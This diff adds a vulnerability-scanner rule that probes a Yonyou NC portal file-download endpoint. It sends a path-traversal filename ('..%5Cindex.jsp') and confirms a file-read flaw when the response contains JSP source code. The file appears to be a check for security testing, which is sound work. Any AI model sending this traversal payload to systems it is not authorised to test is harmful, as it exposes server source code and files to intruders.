@@ -1,0 +1,8 @@
+name: yongyou-nc-download-fileread
+rules:
+  - method: GET
+    path: "/portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"response.addHeader") && response.body.bcontains(b"request.getSession")
+detail:
+  author: 666
